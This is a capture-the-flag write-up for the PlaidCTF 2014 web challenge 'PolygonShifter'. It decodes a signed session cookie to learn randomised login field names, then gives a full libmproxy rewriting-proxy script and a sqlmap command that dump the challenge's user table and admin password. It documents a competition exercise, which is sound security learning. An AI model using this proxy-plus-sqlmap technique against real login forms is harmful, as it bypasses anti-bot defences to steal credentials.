---
layout: post
title: "PlaidCTF 2014 Writeups"
description: ""
category: writeups
tags:
- plaidctf2014
- 2014
- plaidctf
- pctf
---
<!--{% include JB/setup %}-->

<a href="polygonshifter"></a>

### Web 100 - PolygonShifter

We're presented with a "bot-unfriendly" example login page. The names of the username and password fields in the source are generated with each page, along with the action path:

    <form action="/kd0Opm3615utl3YSLs0g" method="POST">
        <label for="" style="text-align:left;">Username</label>
        <input type="text" id="0YkfgNs8LGlEO9F9NwhM" name="8V7Qt7KtSJL3OW9zpwPj">
        <label for="I48lIt3mdAdDB0ErbYx3" style="text-align:left;">Password</label>
        <input type="password" id="I48lIt3mdAdDB0ErbYx3" name="kzDhvllIYyqf3uHH6lZN">
        <input class="primary large" type="submit" value="Login">
    </form>

We also receive a cookie `session`:

    .eJxdzU0LgjAAgOG_Ejt3UFcXoYvorGDJdJbtEnMuMj9xhjLpvxddyu7vwzsBLvq8qS 
    _XXJYZsCewSIENuEUGCp0e6_N4SI5G6h5YbIwa-2IDnkvQcqWGpsv-GWw9vmUq9UomE 
    1RheNxFLlOnYjVn-ddElKzevYEtsyCn0CN3B4lqz6SLP-ahZFfzSv6tAnSGcUJgBEMa
    FYOmpljL2oGx38zZzwqjsmNVFgh9w6E1IqpLP4jXkHvG2zxfx2xWgw.BiyFoA.MVsPd
    sBLjDQAqPoi9JQyAHAzQsQ

This is the form of a signed, timestamped data cookie. The period at the beginning of the string indicates that the cookie is zlib-compressed, `BiyFoA` is the representation of the timestamp, and `MVsPdsBLjDQAqPoi9JQyAHAzQsQ` is the signature of the cookie.

We can dissect cookies in Python:

    >>> session = '.eJxdzU0LgjAAgOG_Ejt3UFcXoYvorGDJdJbtEnMuMj9xhjLpvxd
    dyu7vwzsBLvq8qS_XXJYZsCewSIENuEUGCp0e6_N4SI5G6h5YbIwa-2IDnkvQcqWGps
    v-GWw9vmUq9UomE1RheNxFLlOnYjVn-ddElKzevYEtsyCn0CN3B4lqz6SLP-ahZFfzS
    v6tAnSGcUJgBEMaFYOmpljL2oGx38zZzwqjsmNVFgh9w6E1IqpLP4jXkHvG2zxfx2xW
    gw.BiyFoA.MVsPdsBLjDQAqPoi9JQyAHAzQsQ'
    >>> session = session.split('.')[1]
    >>> len(session)
    254
    >>> session += '='*(-len(session)%4) # add padding
    >>> import base64, zlib
    >>> zlib.decompress(base64.urlsafe_b64decode(session))
    '{"action_field":{" b":"a2QwT3BtMzYxNXV0bDNZU0xzMGc="},
      "password_field":{" b":"a3pEaHZsbElZeXFmM3VISDZsWk4="},
      "password_id":{" b":"STQ4bEl0M21kQWREQjBFcmJZeDM="},
      "username_field":{" b":"OFY3UXQ3S3RTSkwzT1c5enB3UGo="},
      "username_id":{" b":"MFlrZmdOczhMR2xFTzlGOU53aE0="}}'

`password_field` and `username_field` are the base64-encoded field names on the example login page.

Some attempts revealed that the username and password fields were vulnerable to SQL injection; we were able to achieve errors, and log in as `test` even when providing a username of `admin`. sqlmap would be the tool to use, except the form submission path, username field name, and password field name, are randomized and then stored in a signed cookie. Each request must be submitted to a different path with random parameter names, and sqlmap is not suited to doing this.

So, we used libmproxy to build a proxy to rewrite outgoing requests, and direct sqlmap to pass requests through it:

    from libmproxy import controller, proxy, flow
    import os
    import base64
    import zlib
    import json
    class StickyMaster(controller.Master):
        def __init__(self, server):
            controller.Master.__init__(self, server)
            self.cookies=[]
        def run(self):
            try:
                return controller.Master.run(self)
            except KeyboardInterrupt:
                self.shutdown()

        def handle_request(self, msg):
            hid = (msg.host, msg.port)
            msg.headers["Cookie"] = ['; '.join(self.cookies)]
            msg.headers['User-Agent'] = ['Mozilla/5.0 (X11; Linux x86_64) \
                AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152\
                Safari/537.36']
            if msg.path == '/ACTIONPLS':
                msg.path = '/'+base64.b64decode(self.fields['action_field'][' b'])
                print "Changing path to", msg.path
                params = msg.get_form_urlencoded()
                u_param = [params['username'][0]]
                p_param = [params['password'][0]]
                print "incoming parameters: ",u_param, p_param
                newparams = flow.ODict()
                newparams[base64.b64decode(self.fields['username_field'][' b'])] = u_param
                newparams[base64.b64decode(self.fields['password_field'][' b'])] = p_param 
                print "Changed params to:"
                print newparams
                msg.set_form_urlencoded(newparams)
            msg.reply()

        def handle_response(self, msg):
            hid = (msg.request.host, msg.request.port)
            print "response", hid
            if msg.headers["set-cookie"]:
                print msg.headers["set-cookie"]
                self.cookies = [x.split(';')[0] for x in msg.headers["set-cookie"] if 'delete' not in x]   
                self.scookie = self.cookies[0].split('=')[1]
                self.fields = self.scookie.split('.')[1]
                self.fields+=('='*(-len(self.fields)%4))
                self.fields = json.loads(zlib.decompress(base64.urlsafe_b64decode(self.fields)))
                print self.fields
            msg.reply()


    config = proxy.ProxyConfig()
    server = proxy.ProxyServer(config, 7222)
    m = StickyMaster(server)
    m.run()

The proxy will rewrite `username` and `password` using the field names from the most recent signed cookie, and change the request path similarly. Then, we can use sqlmap to inject on fields named `username` and `password` using the URL `/ACTIONPLS`. The final step is to ensure that each outgoing request has a fresh signed cookie. We use the `--eval` sqlmap flag to send a request to `/example` before each injection attempt, also through the proxy. The final sqlmap command we used is:

    sqlmap -u "http://54.204.80.192/ACTIONPLS" --data="username=test&password=test"\
     --proxy="http://127.0.0.1:7222"\
     --eval="import urllib,time; urllib.urlopen('http://54.204.80.192/example',\
    proxies={'http':'http://127.0.0.1:7222'});"\
     -s /tmp/sqlmapoutputEVk5JE/54.204.80.192/session.sqlite\
     --exclude-sysdbs -T polygon_user --threads=8 --dump -D polygon_db

The output:

    Database: polygon_db
    Table: polygon_user
    [2 entries]
    +----+----------+--------------------------------+
    | id | username | password                       |
    +----+----------+--------------------------------+
    | 1  | test     | test                           |
    | 2  | admin    | n0b0t5_C4n_bYpa5s_p0lYm0rph1Sm |
    +----+----------+--------------------------------+

Logging in as admin with that password displays `my password is the flag`, which it is!
